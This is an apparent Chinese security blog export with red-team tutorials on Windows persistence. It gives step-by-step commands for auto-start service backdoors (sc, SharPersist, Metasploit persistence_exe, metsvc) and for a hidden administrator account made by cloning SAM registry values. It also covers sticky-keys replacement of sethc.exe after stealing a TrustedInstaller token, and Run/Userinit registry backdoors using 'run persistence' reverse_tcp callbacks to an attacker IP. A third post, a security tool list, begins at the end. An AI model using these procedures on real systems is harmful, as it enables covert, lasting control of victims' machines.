<h2 id="5-Windows-服务后门"><a href="#5-Windows-服务后门" class="headerlink" title="5.Windows 服务后门"></a><strong>5.Windows 服务后门</strong></h2><p>在Windows主机上，获得了管理员的权限后，我们可以通过创建服务并将服务设置自启动的方式，来对目标主机进行持久控制。</p>
<p>如果未正确配置Windows环境中的服务或这些服务可以用作持久性方法，则这些服务可能导致权限提升。创建 一个新的服务需要管理员级别的特权，它已经不是隐蔽的持久性技术。</p>
<p>利用sc命令手动创建</p>
<p>（1）首先在目标主机上传新生成的msf木马： </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%BA%8C)/640-1653129827204182.png" alt="图片"></p>
<p>如果帐户具有本地管理员特权，则可直接利用sc命令从目标主机的命令行中创建服务。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc create backdoor binpath= &quot;C:\Users\Administrator\backdoor.exe&quot; start= auto // 创建服务后门 </span><br><span class="line">binpath：用于执行任意有效负载 </span><br><span class="line">auto：用于确保恶意服务将自动启动。</span><br></pre></td></tr></table></figure>

<p><strong>注意，</strong>所有选项的每个&#x3D;号之前 一定不要有空格 &#x3D;号后面一定要有空格，否则会错误。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%BA%8C)/640-1653129827204183.png" alt="图片"></p>
<p>如上图，服务创建成功，然后我们可以在攻击机上重新开启一个metasploit监听，等目标机重启时，目标机就会上线，如下图所示，成功得到了目标机的meterpreter，并且还是system权限的 </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://mmbiz.qpic.cn/mmbiz_png/A6dwibvVP9KlbeqnkVW5Rob3ITuxA9s9JziaytPPD3M6agNGlYWcoIBiahiagnMvFCVCjOYLzNFpajHJibKIPF8lPYw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p>也可以执行“sc start backdoor”命令立即启动该服务。</p>
<p><strong>注意：</strong>我们在上图新开启的metasploit监听中，使用“set AutoRunScript migrate -f”设置了自动迁 移进程，这是因为当一个进程在Windows系统中启动后，必须与服务控制管理器进行通信，如果没有进行通 信，服务控制管理器会认为出现了错误，进而终止这个进程，所以如果我们不设置自动迁移进程，这个 meterpreter会很快就断掉了。</p>
<p><strong>利用SharPersist工具创建</strong> </p>
<p>下载地址：</p>
<p><em><a href="https://github.com/fireeye/SharPersist/releases">https://github.com/fireeye/SharPersist/releases</a> <a href="https://github.com/fireeye/SharPersist">https://github.com/fireeye/SharPersist</a></em></p>
<p>除了利用上面的sc命令，我们还可以利用SharPersist工具。SharPersist支持在受感染系统中创建新服务 的持久性技术，在系统上安装新服务需要本地管理员。 </p>
<p>（1） 在目标主机上传新生成的metasploit木马程序backdoor2.exe和SharPersist.exe程序： </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%BA%8C)/640-1653129827205185.png" alt="图片"></p>
<p>（2）使用以下命令添加新服务，该服务将在Windows启动期间执行任意的有效负载：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SharPersist.exe -t service -c &quot;C:\Windows\System32\cmd.exe&quot; -a &quot;/c C:\Users\Administrator\backdoor2.exe&quot; -n &quot;backdoor2&quot; -m add</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://mmbiz.qpic.cn/mmbiz_png/A6dwibvVP9KlbeqnkVW5Rob3ITuxA9s9J7OR2eVtgW1hicG03icL2Gib5KTIataDiarUpFGv4fEHbW8cawArgxAFZlg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p>如上图，服务创建成功，我们在攻击机上新开启一个metasploit监听，当目标主机重启时，目标主机便 能上线，如下图所示成功得到了目标机的meterpreter，并且还是system权限的 </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://mmbiz.qpic.cn/mmbiz_png/A6dwibvVP9KlbeqnkVW5Rob3ITuxA9s9JU8fN5UKjeQsgrzPQpUeKyfdMAoiaQiaSzQiaAucPB9uwJUCfWUUf0LicyQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p>注意：不要忘记迁移进程。</p>
<p>Metasploit下的利用 Metasploit框架还具有一个后渗透模块，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post/windows/manage/persistence_exe</span><br></pre></td></tr></table></figure>

<p>该模块需要以下 配置，并将可执行文件放置在目标主机的可写位置： </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://mmbiz.qpic.cn/mmbiz_png/A6dwibvVP9KlbeqnkVW5Rob3ITuxA9s9JmJcMibqE7ibhv69iblmDndITuXeUiceBZffxMaia4M7OcjR7YEndyTD32jg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p>如上图所示，该模块支持的持久性技术有： </p>
<p>\1. 注册表运行键后门（USER，即我们前文提到的“run persistence”命令就是用的这个技术）</p>
<p> \2. Windows服务后门（SERVICE） 使用该模块创建服务后门时，需要将启动变量修改为SERVICE，以便在系统上安装新服务。</p>
<p>以下是创建服务的设置： </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use post/windows/manage/persistence_exe set REXEPATH /root/backdoor.exe // 攻击机本地要上传到目标机的paylaod路径 </span><br><span class="line">set SESSION 1 </span><br><span class="line">set STARTUP SERVICE </span><br><span class="line">set LOCALEXEPATH C:\\Users\\Administrator // payload上传到目标机后存放的路径</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
<p>如上图，服务后门创建成功，之后的使用方式与前面相同。除此之外，在metasploit上，我们还可以用metsvc模块创建服务，建立持久后门。metsvc后渗透攻击模块其实就是将Meterpreter以系统服务的形式安装到目标主机，它会上传三个文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">metsvc.dll </span><br><span class="line">metsvc-service.exe </span><br><span class="line">metsvc.exe</span><br></pre></td></tr></table></figure>

<p>并通过服务启动，服务名为meterpreter。 </p>
<p>常用命令： </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run metsvc –h # 查看帮助 </span><br><span class="line">run metsvc –A #自动安装后门</span><br></pre></td></tr></table></figure>

<p>我们使用“run metsvc –A”自动安装后门： </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%BA%8C)/640-1653130200232205.png" alt="图片"></p>
<p>如上图，服务后门安装成功。接着我们启用另一个终端并进入msfconsole，使用如下命令即可连接后门：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler set payload windows/metsvc_bind_tcp set RHOST 192.168.52.1 //目标机ip set LPORT 31337 //如上图，后门安装过程信息中有 exploit //获取到的会话是system权限</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>RedTeam</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>权限维持（一）</title>
    <url>/posts/8035962c.html</url>
    <content><![CDATA[<blockquote>
<p>转载自：<a href="https://mp.weixin.qq.com/s/ZwM2h3OHhnH9WYZWO6GFdw">https://mp.weixin.qq.com/s/ZwM2h3OHhnH9WYZWO6GFdw</a></p>
</blockquote>
<p><strong>0x00 前言</strong></p>
<p>在攻击者利用漏洞获取到某台机器的控制权限之后，会考虑将该机器作为一个持久化的据点，种植一个<strong>具备持久化的后门</strong>，从而随时可以连接该被控机器进行深入渗透。当我们在渗透过程中通过漏洞获取到目标主机权限后，往往会因为服务器管理员发现和修补漏洞而导致对服务器权限的丢失，所以<strong>权限维持</strong>就显得很重要了。</p>
<h1 id="0x01-windows权限维持"><a href="#0x01-windows权限维持" class="headerlink" title="0x01 windows权限维持"></a><strong>0x01 windows权限维持</strong></h1><h2 id="1-Windows系统隐藏账户"><a href="#1-Windows系统隐藏账户" class="headerlink" title="1. Windows系统隐藏账户"></a><strong>1. Windows系统隐藏账户</strong></h2><p><strong>该方法是通过建立隐藏账户，制作系统用户远程控制后门，维持目标Windows系统权限。</strong></p>
<p>制作方法跟步骤如下：</p>
<p>在目标主机cmd中输入以下命令，创建一个名为whoami$的隐藏账户，并把该隐藏账户设置为管理员权限。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640.jpeg" alt="图片"></p>
<p>如上图，我们已经创建成功，执行net user命令，发现是看不到whoami$用户的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user whoami$ Liu78963 /add</span><br><span class="line">net localgroup administrators whoami$ /add</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643046127.jpeg" alt="图片"></p>
<p>但是这就结束了吗，没有！虽然上面net user看不见该隐藏用户，但是在控制面板和计算机管理的本地用户和组中，仍然是可以看得到该用户的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643046128.jpeg" alt="图片"></p>
<p>为了更好地隐藏我们的后门账户，我们还要开启目标主机的远程桌面进行如下操作。</p>
<p>打开注册表编辑器，找</p>
<p>*<strong>HKEY_LOCAL_MACHINE\SAM\SAM*</strong> ，</p>
<p>单机右键，选择“权限”，把Administrator用户的权限，设置成“完全控制”权限，然后关闭注册表编辑器，再次打开即可。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643046129.jpeg" alt="图片"></p>
<p>这样SAM下的文件就都能看见了。</p>
<p>然后，在注册表编辑器的</p>
<p>*<strong>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names*</strong> ，</p>
<p>点击Administrator用户，在左侧找到和在右边显示的键值的类型一项“0x1f4”相同的目录名，也就是箭头所指目录***“000001F4”***：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643046130.jpeg" alt="图片"></p>
<p>复制000001F4 目录中的F键的值：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643046131.jpeg" alt="图片"></p>
<p>然后找到与隐藏账户whoami$右边类型的键值“0x3e9”相同的目录名，也就是。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643046132.jpeg" alt="图片"></p>
<p>然后将000001F4 的F值粘贴到000003E9 的F值中，点击确定：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643047133.jpeg" alt="图片"></p>
<p>然后从注册表中右键导出000003E9 和whoami$，并删除whoami$用户 </p>
<p>- </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user whoami$ /del：</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643047134.jpeg" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643047135.jpeg" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643047136.jpeg" alt="图片"></p>
<p>此时，查看注册表以及本地用户和组或者控制面板，whoami$用户已经没有了。</p>
<p>最后，将刚才导出的两个后缀为.reg的注册表项导入注册表中</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643047137.jpeg" alt="图片"></p>
<p>这样我们的隐藏账户whoami$就创建好了。现在，不管你是在命令提示符下输入 net user 或者在系统用户管理界面都是看不到whoami$这个账户的，只有在注册表中才能看得到。</p>
<h2 id="2-Shift-粘滞键后门"><a href="#2-Shift-粘滞键后门" class="headerlink" title="2. Shift 粘滞键后门"></a><strong>2. Shift 粘滞键后门</strong></h2><p>如果你在电脑上连按五次shift键，你就会发现电脑屏幕上弹出了一个叫做“粘滞键”的程序：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643047138.jpeg" alt="图片"></p>
<p>即使在没有登录进系统之前，连按五次shift键也可以弹出这个程序：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643047139.jpeg" alt="图片"></p>
<p>思考一下，如果我们知道了这个程序的绝对路径，那么我们就可以将cmd.exe伪装成这个粘滞键程序，</p>
<p><strong>当我们连按五次shift键时，便会弹出一个CMD命令行窗口，那么我们就可以无需登录进系统便可以控制目标主机了。</strong></p>
<p>粘滞键程序名称为“sethc.exe”，其路径为*<strong>“c:\windows\system32\sethc.exe”*</strong></p>
<p>利用粘滞键做后门是一种比较常见的持续控制方法。其基本流程如下：</p>
<p>（1）首先，我们手动或利用工具，找到sethc.exe将其删除或改名为sethc.exe.bak，</p>
<p>（2）接着将cmd.exe程序复制一个副本，并命名为“sethc.exe”。</p>
<p>（3）最后，重启计算机再次按下5次Shift键时，就会弹出CMD界面，后门制作成功。</p>
<p>在目标主机上执行如下命令即可：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd c:\windows\system32</span><br><span class="line">move sethc.exe sethc.exe.bak // 将sethc.exe重命名</span><br><span class="line">copy cmd.exe sethc.exe // 将一个cmd.exe副本保存伪装成sethc.exe</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643048140.jpeg" alt="图片"></p>
<p>此时，我们打开目标主机的远程桌面，连续按下五次shift键，便可以看到目标主机屏幕上成功弹出了一个CMD窗口：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643048141.jpeg" alt="图片"></p>
<p>如上图，该cmd是以system权限运行的，接下来我们就可以无需知道登录密码，无需登录，直接对目标主机执行各种高权限的操作了，也完全可以新建一个高权限用户直接登录进入系统，是不是很有意思？</p>
<p>但是，先别高兴的太早了，在一些做了防护的主机上，即使是SYSTEM权限也是无法修改sethc.exe的：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643048142.jpeg" alt="图片"></p>
<p>只有TrustedInstaller权限才可以，这时，我们就要先模拟一个TrustedInstaller权限的令牌获取TrustedInstaller权限，然后再执行上述操作。我们的思路如下：</p>
<p><strong>当我们启动TrustedInstaller服务时会启动进程TrustedInstaller.exe，该程序的权限为NTSERVICE\TrustedInstaller，那么我们就可以窃取该进程的令牌。</strong></p>
<p>首先进入shell启动TrustedInstaller服务：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc.exe start TrustedInstaller # 先进入shell启动TrustedInstaller服务</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643048143.jpeg" alt="图片"></p>
<p>然后执行如下即可：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use incognito</span><br><span class="line">ps 					# 找到TrustedInstaller的进程PID，这里为3476</span><br><span class="line">steal_token &lt;PID&gt; 	# 从该进程中窃取令牌</span><br><span class="line">getuid</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643049144.jpeg" alt="图片"></p>
<p>此时便可以对sethc.exe进行任何操作了：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643049145.jpeg" alt="图片"></p>
<h2 id="3-注册表键后门"><a href="#3-注册表键后门" class="headerlink" title="3.  注册表键后门"></a><strong>3.  注册表键后门</strong></h2><p>该方法是通过将需要执行的后门程序或者攻击脚本路径添加到注册表的自动启动项中，从而实现目标主机启动或登录时便会执行后门程序使我们获得其控制权限。</p>
<p>一般我们使用注册表的如下位置：</p>
<p><em><strong>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run &#x2F;&#x2F; 开启时启动程序</strong></em></p>
<p><em><strong>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit &#x2F;&#x2F; 登录时启动程序</strong></em></p>
<p>首先我们制作一个metasploit后门：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643049146.jpeg" alt="图片"></p>
<p>将该后门程序上传到目标主机的C:\Windows\System32目录中：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643049147.jpeg" alt="图片"></p>
<p>然后在目标主机的meterpreter执行如下命令注册表进行操作制作后门：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run #枚举run下的key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v backdoor -d &#x27;C:\windows\system32\backdoor.exe&#x27; #设置键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v</span><br><span class="line">backdoor #查看键值</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643049148.jpeg" alt="图片"></p>
<p>如上图所示，后门创建成功。此时我们重新开一个metasploit监听，然后输入“shutdown -r -t 0”命令让目标主机重启，当目标主机重新启动后便会启动执行backdoor.exe后门程序，我们攻击机的新开的metasploit监听上就会成功上线：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%B8%80)/640-1653129643049149.jpeg" alt="图片"></p>
<p>我们还可以操作注册表的Userinit键：</p>
<p>*<strong>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit*</strong></p>
<p>让目标主机在用户进行登录时，winlogon运行指定的后门程序。</p>
<p>除此之外还有以下可利用的注册表键：</p>
<p>*<strong>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce &#x2F;&#x2F; 只会在开机*</strong></p>
<p>*<strong>时启动一次*</strong></p>
<p>*<strong>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices*</strong></p>
<p>*<strong>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce*</strong></p>
<p><strong>Metasploit 下的利用</strong></p>
<p>Metasploit通过使用Meterpreter脚本和后渗透模块来支持通过注册表的持久性。Meterpreter脚本将以VBS脚本的形式创建一个有效payload，该payload将被上传到目标主机的磁盘上，并创建一个注册表项，该注册表项将在用户登录期间循环运行该有效负载。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run persistence -U -P windows/x64/meterpreter/reverse_tcp -i 5 -p 4444 -r</span><br><span class="line">192.168.52.129</span><br><span class="line">run persistence -X -P windows/x64/meterpreter/reverse_tcp -i 5 -p 4444 -r</span><br><span class="line">192.168.52.129</span><br><span class="line">//-U指定启动方式为用户登录时自启动</span><br><span class="line">//-X指定启动的方式为开机自启动</span><br><span class="line">//-P 指定所使用的payload</span><br><span class="line">//-i不断尝试反向连接的时间间隔，我们这里设置的是5秒钟执行一次</span><br><span class="line">//–r指定攻击者的ip</span><br><span class="line">//-p 指定攻击者监听的端口</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如上图所示执行成功，生成后门后，只要目标主机重启或者登录，我们将在特定的时间间隔保持meterpreter会话了。</p>
]]></content>
      <categories>
        <category>RedTeam</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全工具集合</title>
    <url>/posts/1a462f01.html</url>
    <content><![CDATA[<p><strong>目录</strong></p>
<ul>
<li>漏洞及渗透练习平台</li>
<li>数据库注入练习平台</li>
<li>花式扫描器</li>
<li>信息搜集工具</li>
<li>WEB工具</li>
<li>windows域渗透工具</li>
<li>漏洞利用及攻击框架</li>
<li>漏洞POC&amp;EXP</li>
<li>中间人攻击及钓鱼</li>
<li>密码pj</li>
<li>二进制及代码分析工具</li>
<li>EXP编写框架及工具</li>
<li>隐写相关工具</li>
<li>各类安全资料</li>
<li>各类CTF资源</li>
<li>各类编程资源</li>
<li>Python</li>
</ul>
<h3 id="漏洞及渗透练习平台"><a href="#漏洞及渗透练习平台" class="headerlink" title="漏洞及渗透练习平台"></a><strong>漏洞及渗透练习平台</strong></h3><p>WebGoat漏洞练习环境</p>
<p><a href="https://github.com/WebGoat/WebGoat">https://github.com/WebGoat/WebGoat</a></p>
<p><a href="https://github.com/WebGoat/WebGoat-Legacy">https://github.com/WebGoat/WebGoat-Legacy</a></p>
<p>Damn Vulnerable Web Application(漏洞练习平台)</p>
<p><a href="https://github.com/RandomStorm/DVWA">https://github.com/RandomStorm/DVWA</a></p>
